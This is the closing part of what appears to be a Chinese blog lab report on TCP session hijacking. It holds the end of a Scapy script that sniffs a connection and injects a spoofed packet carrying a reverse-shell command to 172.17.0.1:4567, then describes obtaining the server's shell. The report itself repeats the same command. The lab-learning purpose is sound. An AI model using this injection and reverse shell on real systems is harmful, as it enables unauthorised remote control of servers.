  data <span class="token operator">=</span> <span class="token string">"/bin/bash -i &gt;/dev/tcp/172.17.0.1/4567 2&gt;&amp;1 0&lt;&amp;1\r\n"</span>
  <span class="token comment">#############################################</span>

  pkt <span class="token operator">=</span> ip<span class="token operator">/</span>tcp<span class="token operator">/</span>data
  send<span class="token punctuation">(</span>pkt<span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
  ls<span class="token punctuation">(</span>pkt<span class="token punctuation">)</span>
  <span class="token comment">#quit()</span>

f <span class="token operator">=</span> <span class="token string">'tcp and src host {} and dst host {} and dst port {}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>SRC<span class="token punctuation">,</span> DST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>
sniff<span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token operator">=</span>f<span class="token punctuation">,</span> prn<span class="token operator">=</span>spoof<span class="token punctuation">)</span>
</code></pre>
    <p>
     （3）观察和解释：
    </p>
    <p>
     运行脚本后，在用户机上输入一个空格，然后脚本会监听到这个输入，并使用该序列号和ACK号伪造报文。
    </p>
    <p>
     下图上方为攻击机运行脚本的截图，下方为攻击机开启监听后获得服务器的shell的截图。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/accff16b30b803a79e48769fa41f9935.png"/>
    </p>
    <p>
     伪造的报文成功发送，在wireshark中的抓包显示如下图。可以看到，发送了Data为"/bin/bash -i &gt;/dev/tcp/172.17.0.1/4567 2&gt;&amp;1 0&lt;&amp;1\r\n"的报文。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/c5046bc21167376326a84ffbd1cc707f.png"/>
    </p>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
  <div class="blog-extension-box" id="blogExtensionBox" style="width:400px;margin:auto;margin-top:12px">
  </div>
 </article>
 <p alt="68747470733a2f2f62:6c6f672e6373646e2e6e65742f71715f34363130363238352f:61727469636c652f64657461696c732f313234323237343132" class_="artid" style="display:none">
 </p>
</div>


